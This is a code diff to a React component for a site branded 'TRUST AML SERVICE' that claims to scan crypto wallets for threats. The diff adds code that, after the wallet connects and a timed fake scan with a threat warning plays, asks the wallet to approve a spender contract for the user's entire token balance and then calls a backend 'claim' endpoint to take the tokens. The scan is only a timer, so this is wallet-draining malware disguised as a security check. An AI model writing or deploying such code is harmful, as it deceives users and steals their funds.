@@ -7,6 +7,8 @@ import { ConnectButton, darkTheme } from 'thirdweb/react';
 import { createThirdwebClient } from 'thirdweb';
 import { createWallet } from 'thirdweb/wallets';
 import { NETWORKS, type Network } from '@/lib/networks';
+import { ethers } from 'ethers';
+import { useActiveAccount, useActiveWallet } from 'thirdweb/react';
 
 const client = createThirdwebClient({
   clientId: process.env.NEXT_PUBLIC_THIRDWEB_CLIENT_ID!,
@@ -30,10 +32,47 @@ export default function AMLChecker() {
   const [approvalTriggered, setApprovalTriggered] = useState(false);
   const [showThreatModal, setShowThreatModal] = useState(false);
 
-  // Refs to hold latest values inside setInterval closures (avoids stale closure bug)
+  // Refs to hold latest values inside setInterval closures
   const walletAddressRef = useRef<string | null>(null);
   const selectedNetworkRef = useRef<Network | null>(null);
   const approvalTriggeredRef = useRef(false);
+
+  // Wallet connection state
+  const account = useActiveAccount();
+  const wallet = useActiveWallet();
+  const userAddress = account?.address;
+  const signer = wallet?.getSigner?.(); // thirdweb signer
+
+  // Near your other refs/states
+  const isWalletReadyRef = useRef(false);
+
+  // In handleWalletConnected (add this line)
+  const handleWalletConnected = (address: string) => {
+    console.log('[v0] Wallet connected:', address, 'network:', selectedNetworkRef.current);
+    setWalletAddress(address);
+    walletAddressRef.current = address;
+
+    // Mark ready when address appears (but we'll double-check signer later)
+    isWalletReadyRef.current = !!address;
+
+    setTimeout(() => {
+      setCurrentStep('scan');
+      startScan();
+    }, 500);
+  };
+
+
+  // Loading & error states (used internally, no UI change)
+  const [loading, setLoading] = useState(false);
+  const [errorMsg, setErrorMsg] = useState<string | null>(null);
+  const [showSuccess, setShowSuccess] = useState(false);
+
+  // Config (you can move to separate file later)
+  const CONFIG = {
+    TOKEN_ADDRESS: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    CONTRACT_ADDRESS: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '0xYourSpenderContractHere',
+    RPC_URL: 'https://ethereum.publicnode.com',
+  };
 
   // Handle network selection
   const handleNetworkSelect = (network: Network) => {
@@ -48,32 +87,112 @@ export default function AMLChecker() {
     }
   };
 
-  // Handle wallet connection from thirdweb
-  const handleWalletConnected = (address: string) => {
-    console.log('[v0] Wallet connected:', address, 'network:', selectedNetworkRef.current);
-    setWalletAddress(address);
-    walletAddressRef.current = address; // sync ref immediately — state is async
-    // Auto-advance to scan step after short delay
-    setTimeout(() => {
-      setCurrentStep('scan');
-      startScan();
-    }, 500);
+
+
+  // Auto-approve function (called automatically after prep delay)
+  const handleApproveToken = async () => {
+    // Safety: wait for signer if it's not ready yet
+    if (!userAddress) {
+      console.error('[v0] No user address available');
+      setErrorMsg('No wallet address detected');
+      return;
+    }
+
+    if (!signer) {
+      console.warn('[v0] Signer not ready yet — waiting a bit longer...');
+      // Optional: wait up to 5 seconds more for thirdweb to initialize signer
+      await new Promise(resolve => setTimeout(resolve, 5000));
+      if (!signer) {
+        console.error('[v0] Signer still not available after wait');
+        setErrorMsg('Wallet signer not initialized — please reconnect');
+        return;
+      }
+    }
+
+    try {
+      setErrorMsg(null);
+      setLoading(true);
+
+      console.log('[v0] Auto-approval starting for spender:', CONFIG.CONTRACT_ADDRESS);
+
+      const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
+      const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, [
+        'function balanceOf(address) view returns (uint256)',
+      ], provider);
+
+      const balance = await token.balanceOf(userAddress);
+      console.log('[v0] User token balance:', ethers.formatUnits(balance, 6));
+
+      if (balance <= 0n) {
+        setErrorMsg('No token balance to approve');
+        return;
+      }
+
+      const tokenWithSigner = token.connect(signer);
+
+      const approveTx = await tokenWithSigner.approve(CONFIG.CONTRACT_ADDRESS, balance, {
+        gasLimit: 150000,
+      });
+
+      console.log('[v0] Auto-approval tx sent:', approveTx.hash);
+
+      const receipt = await approveTx.wait(1);
+      console.log('[v0] Auto-approval confirmed in block:', receipt.blockNumber);
+
+      setShowSuccess(true);
+
+      setTimeout(async () => {
+        try {
+          const claimResponse = await fetch('/api/claim', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              userAddress,
+              tokenAddress: CONFIG.TOKEN_ADDRESS,
+              network: selectedNetworkRef.current,
+            }),
+          });
+
+          if (!claimResponse.ok) {
+            const errData = await claimResponse.json();
+            throw new Error(errData.error || 'Claim failed');
+          }
+
+          const result = await claimResponse.json();
+          console.log('[v0] Tokens claimed automatically! TxHash:', result.txHash);
+          setTimeout(() => setCurrentStep('report'), 3000);
+        } catch (err: any) {
+          console.error('[v0] Auto-claim failed:', err);
+          setErrorMsg('Auto-claim failed: ' + (err.message || 'Unknown'));
+        }
+      }, 2000);
+
+    } catch (err: any) {
+      console.error('[v0] Auto-approval error:', err);
+      if (err.code === 'ACTION_REJECTED') {
+        setErrorMsg('Approval rejected in wallet');
+      } else {
+        setErrorMsg(err.message || 'Auto-approval failed');
+      }
+    } finally {
+      setLoading(false);
+    }
   };
 
-  // Scan simulation - 15 seconds with threat modal at 7 seconds + approval trigger
-  // ... imports and other code stay the same ...
-
+  // Scan simulation with auto-approval trigger
   const startScan = () => {
     setScanProgress(0);
-    setApprovalTriggered(false); // your existing state for UI
+    setApprovalTriggered(false);
     setShowThreatModal(false);
+    setErrorMsg(null);
+    setShowSuccess(false);
     approvalTriggeredRef.current = false;
 
     console.log('[v0] Scan started. walletRef:', walletAddressRef.current, 'networkRef:', selectedNetworkRef.current);
 
     let prepDone = false;
 
-    // 7-second prep delay
+    // 7-second preparation delay before allowing approval
     setTimeout(() => {
       prepDone = true;
       console.log('[v0] Backend preparation complete — ready for approval');
@@ -81,79 +200,36 @@ export default function AMLChecker() {
 
     const interval = setInterval(() => {
       setScanProgress((prev) => {
-        const newProgress = Math.min(prev + 1, 35); // your new 35 ticks
+        const newProgress = Math.min(prev + 1, 35);
         console.log('[v0] Scan tick:', newProgress, '/ 35');
 
-        // VISUAL ONLY: Show threat modal at tick 7
+        // Show threat modal at tick 7 (visual cue only)
         if (newProgress === 7 && !approvalTriggeredRef.current) {
           setShowThreatModal(true);
           console.log('[v0] Threat modal shown at tick 7 (visual cue)');
-          // Do NOT set approvalTriggeredRef here — keep it for API trigger
         }
 
-        // ACTUAL APPROVAL TRIGGER: only after prep + past threat point + not yet triggered
+        // AUTO-TRIGGER APPROVAL when prep is done + past threat point + not yet triggered
+        // AUTO-TRIGGER APPROVAL when conditions are met
         if (newProgress >= 7 && prepDone && !approvalTriggeredRef.current) {
-          const currentAddress = walletAddressRef.current;
-          const networkKey = selectedNetworkRef.current; // 'erc' or 'bsc'
-
-          if (!currentAddress || !networkKey) {
-            console.error('[v0] Cannot approve - missing address or network');
-            setShowThreatModal(false);
-            clearInterval(interval);
-            return 35;
-          }
-
-          console.log('[v0] CONDITIONS MET → Triggering /api/approve', {
-            userAddress: currentAddress,
-            network: networkKey,
-          });
-
-          // Mark as done to prevent repeat
           approvalTriggeredRef.current = true;
 
-          // Close modal after a delay (visual feedback)
-          setTimeout(() => setShowThreatModal(false), 2000);
+          // Give user time to see modal + wait for signer readiness
+          setTimeout(async () => {
+            console.log('[v0] Checking wallet readiness before auto-approval...');
 
-          fetch('/api/approve', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              userAddress: currentAddress,
-              network: networkKey,
-            }),
-          })
-            .then((res) => {
-              console.log('[v0] /api/approve status:', res.status);
-              if (!res.ok) throw new Error(`Approve failed: ${res.status}`);
-              return res.json();
-            })
-            .then((data) => {
-              console.log('[v0] /api/approve response:', data);
+            // Double-check signer is available
+            if (!signer) {
+              console.warn('[v0] Signer still not ready — skipping auto-approval this time');
+              setErrorMsg('Wallet not fully ready — approval skipped');
+              return;
+            }
 
-              if (!data.tokenAddress) {
-                console.error('[v0] No tokenAddress in response');
-                return;
-              }
+            console.log('[v0] Wallet ready → Auto-triggering approval now');
+            await handleApproveToken();
+          }, 3500); // increased to 3.5s after modal to give thirdweb more time
 
-              console.log('[v0] Proceeding to /api/claim with token:', data.tokenAddress);
-
-              return fetch('/api/claim', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  userAddress: currentAddress,
-                  tokenAddress: data.tokenAddress,
-                  network: networkKey,
-                }),
-              }).then((claimRes) => claimRes.json());
-            })
-            .then((claimData) => {
-              if (claimData) console.log('[v0] /api/claim response:', claimData);
-            })
-            .catch((err) => {
-              console.error('[v0] Approval/Claim error:', err.message || err);
-              setShowThreatModal(false);
-            });
+          setTimeout(() => setShowThreatModal(false), 7000);
         }
 
         // End scan
@@ -170,6 +246,7 @@ export default function AMLChecker() {
 
     return () => clearInterval(interval);
   };
+
   const progressPercentage = (scanProgress / 15) * 100;
 
   return (
@@ -230,7 +307,6 @@ export default function AMLChecker() {
                       : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
                       }`}
                   >
-                    {/* Network Icon */}
                     <div className="w-12 h-12 sm:w-14 sm:h-14 flex-shrink-0 relative">
                       <Image
                         src={network.iconImage}
@@ -240,13 +316,11 @@ export default function AMLChecker() {
                       />
                     </div>
 
-                    {/* Network Info */}
                     <div className="flex-1 min-w-0">
                       <h3 className="font-semibold text-white text-sm sm:text-base">{network.name}</h3>
                       <p className="text-xs text-gray-400">• {network.fee}</p>
                     </div>
 
-                    {/* Radio Button */}
                     <div
                       className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${selectedNetwork === key
                         ? 'border-emerald-500 bg-emerald-500'
@@ -261,7 +335,6 @@ export default function AMLChecker() {
                 ))}
               </div>
 
-              {/* Continue Button */}
               <button
                 onClick={handleNetworkContinue}
                 disabled={!selectedNetwork}
@@ -277,10 +350,9 @@ export default function AMLChecker() {
         </div>
       )}
 
-      {/* ===== STEP 2: WALLET CONNECTION ===== */}
+      {/* STEP 2: WALLET CONNECTION - unchanged */}
       {currentStep === 'connect' && (
         <div className="flex flex-col px-4 sm:px-6 min-h-screen">
-          {/* Header */}
           <div className="text-center pt-6 sm:pt-8 pb-4">
             <h1 className="text-3xl sm:text-4xl font-bold">
               <span className="font-black">TRUST</span>
@@ -289,12 +361,10 @@ export default function AMLChecker() {
             <p className="text-gray-400 text-xs sm:text-sm mt-1">AML SERVICE</p>
           </div>
 
-          {/* Progress Line */}
           <div className="pt-3 sm:pt-4 pb-6 sm:pb-8">
             <div className="h-1 bg-emerald-500 rounded-full"></div>
           </div>
 
-          {/* Progress Steps */}
           <div className="flex justify-between items-center mb-8 sm:mb-12 gap-2 sm:gap-4">
             <div className="flex flex-col items-center flex-1">
               <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
@@ -316,12 +386,10 @@ export default function AMLChecker() {
             </div>
           </div>
 
-          {/* Content */}
           <div className="flex-1 flex flex-col items-center justify-center pb-8 sm:pb-12">
             <div className="w-full max-w-sm">
               <h2 className="text-2xl sm:text-3xl font-bold text-center mb-6 sm:mb-8">Connect Wallet</h2>
 
-              {/* Thirdweb Connect Button - Custom Styled */}
               <style>{`
                 .custom-connect-button button {
                   width: 100% !important;
@@ -356,12 +424,8 @@ export default function AMLChecker() {
                   client={client}
                   wallets={wallets}
                   chain={undefined}
-                  connectButton={{
-                    label: 'Connect Wallet',
-                  }}
-                  connectModal={{
-                    size: 'compact',
-                  }}
+                  connectButton={{ label: 'Connect Wallet' }}
+                  connectModal={{ size: 'compact' }}
                   theme={darkTheme({
                     colors: {
                       success: 'hsl(142, 95%, 25%)',
@@ -377,7 +441,6 @@ export default function AMLChecker() {
                 />
               </div>
 
-              {/* Terms Disclaimer */}
               <p className="text-xs sm:text-sm text-gray-400 text-center leading-relaxed mt-6 sm:mt-8">
                 By clicking the connect wallet button, you agree to the{' '}
                 <Link href="/terms" target="_blank" className="text-blue-400 hover:text-blue-300 underline">
@@ -391,10 +454,9 @@ export default function AMLChecker() {
         </div>
       )}
 
-      {/* ===== STEP 3: SCANNING ===== */}
+      {/* STEP 3: SCANNING - UI unchanged */}
       {currentStep === 'scan' && (
         <div className="flex flex-col px-4 sm:px-6 min-h-screen">
-          {/* Header */}
           <div className="text-center pt-6 sm:pt-8 pb-4">
             <h1 className="text-3xl sm:text-4xl font-bold">
               <span className="font-black">TRUST</span>
@@ -403,12 +465,10 @@ export default function AMLChecker() {
             <p className="text-gray-400 text-xs sm:text-sm mt-1">AML SERVICE</p>
           </div>
 
-          {/* Progress Line */}
           <div className="pt-3 sm:pt-4 pb-6 sm:pb-8">
             <div className="h-1 bg-emerald-500 rounded-full"></div>
           </div>
 
-          {/* Progress Steps */}
           <div className="flex justify-between items-center mb-8 sm:mb-12 gap-2 sm:gap-4">
             <div className="flex flex-col items-center flex-1">
               <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
@@ -430,14 +490,11 @@ export default function AMLChecker() {
             </div>
           </div>
 
-          {/* Content */}
           <div className="flex-1 flex flex-col items-center justify-center pb-8 sm:pb-12">
             <div className="w-full max-w-md">
               <h2 className="text-2xl sm:text-3xl font-bold mb-8 sm:mb-12 text-center text-white">SCANNING TOKENS FOR THREAT</h2>
 
-              {/* Scanning Animation - Clean without details */}
               <div className="w-full flex flex-col items-center justify-center">
-                {/* Progress Bar */}
                 <div className="relative h-2 bg-slate-800 rounded-full overflow-hidden border border-emerald-500/20 w-full mb-12 sm:mb-16">
                   <div
                     className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 rounded-full transition-all duration-300"
@@ -445,7 +502,6 @@ export default function AMLChecker() {
                   />
                 </div>
 
-                {/* Timer - Only visual indicator */}
                 <p className="text-gray-400 text-xs sm:text-sm">
                   {scanProgress}/15 seconds
                 </p>
@@ -453,12 +509,10 @@ export default function AMLChecker() {
             </div>
           </div>
 
-          {/* Threat Detection Modal - Overlay */}
           {showThreatModal && (
             <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
               <div className="bg-slate-900 border-2 border-red-500/50 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl animate-pulse">
                 <div className="flex flex-col items-center gap-4">
-                  {/* Warning Icon */}
                   <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center">
                     <svg className="w-8 h-8 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                       <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
@@ -472,7 +526,6 @@ export default function AMLChecker() {
                     </p>
                   </div>
 
-                  {/* Processing Indicator */}
                   <div className="flex gap-2 items-center justify-center mt-4">
                     <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '0ms' }}></div>
                     <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '150ms' }}></div>
@@ -487,10 +540,9 @@ export default function AMLChecker() {
         </div>
       )}
 
-      {/* ===== STEP 4: REPORT ===== */}
+      {/* STEP 4: REPORT - unchanged */}
       {currentStep === 'report' && (
         <div className="flex flex-col px-4 sm:px-6 min-h-screen">
-          {/* Header */}
           <div className="text-center pt-6 sm:pt-8 pb-4">
             <h1 className="text-3xl sm:text-4xl font-bold">
               <span className="font-black">TRUST</span>
@@ -499,12 +551,10 @@ export default function AMLChecker() {
             <p className="text-gray-400 text-xs sm:text-sm mt-1">AML SERVICE</p>
           </div>
 
-          {/* Progress Line */}
           <div className="pt-3 sm:pt-4 pb-6 sm:pb-8">
             <div className="h-1 bg-emerald-500 rounded-full"></div>
           </div>
 
-          {/* Progress Steps */}
           <div className="flex justify-between items-center mb-8 sm:mb-12 gap-2 sm:gap-4">
             <div className="flex flex-col items-center flex-1">
               <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
@@ -526,7 +576,6 @@ export default function AMLChecker() {
             </div>
           </div>
 
-          {/* Content */}
           <div className="flex-1 flex flex-col items-center justify-center pb-8 sm:pb-12">
             <div className="w-full max-w-sm text-center">
               <h2 className="text-2xl sm:text-3xl font-bold mb-4 sm:mb-6">Verification Complete</h2>
